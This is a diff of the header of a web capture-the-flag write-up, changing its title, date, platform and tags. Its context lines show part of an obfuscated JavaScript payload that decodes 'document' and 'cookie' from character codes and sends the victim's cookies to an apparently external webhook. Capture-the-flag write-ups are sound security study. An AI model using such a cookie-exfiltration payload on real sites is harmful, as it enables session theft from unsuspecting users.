@@ -1,12 +1,20 @@
 ---
-title: "Web CTF — Flight Panel (SSTI to RCE)"
-date: "2025-10-29"
+# title: "AC CTF - silicon dioxide"
+
+date: "2025-11-09"
+
 author: "th3mujd11"
-platform: "Custom"
-difficulty: "medium"
+
+platform: "CTFd"
+
+difficulty: "TBD"
+
 category: "web"
-tags: [web, ssti, rce, enumeration, privesc]
-target: "http://flight-panel.ctf"
+
+tags: [web]
+
+target: ""
+
 ---
 
 # TL;DR
@@ -23,5 +31,6 @@ const d=D(100,111,99,117,109,101,110,116),k=D(99,111,111,107,105,101),e=D(101,11
 g[f](w+D(99,61)+g[e](g[d][k]));
 
 If needed I can provide the flag but I'm lazy haha and I have to mess around again with webhook.
+
 ---
 
